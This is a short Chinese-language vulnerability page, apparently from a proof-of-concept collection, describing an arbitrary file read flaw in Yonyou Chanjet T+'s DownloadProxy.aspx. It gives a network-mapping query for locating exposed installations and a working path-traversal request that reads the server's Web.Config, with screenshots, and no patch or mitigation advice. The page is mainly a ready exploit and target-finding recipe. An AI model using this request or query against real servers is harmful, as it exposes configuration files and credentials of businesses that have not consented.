# 用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞

## 漏洞描述

用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 漏洞影响

```
用友 畅捷通T+
```

## 网络测绘

```
app="畅捷通-TPlus"
```

## 漏洞复现

登录页面

![image-20220909104559292](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115827343.png)

验证POC

```
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```

![image-20220909104628456](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115827344.png)

